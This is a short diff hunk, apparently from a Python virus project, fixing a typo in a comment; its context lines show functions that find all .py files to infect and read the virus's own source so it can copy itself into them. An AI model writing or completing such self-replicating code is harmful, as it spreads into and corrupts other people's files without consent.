@@ -8,7 +8,7 @@ import os
 def files_to_infect():
     return glob.glob('*.py')
 
-# getting virus code to cpoy itself to another python files
+# getting virus code to copy itself to another python files
 
 def get_virus_code():
     file = open(__file__,'r')
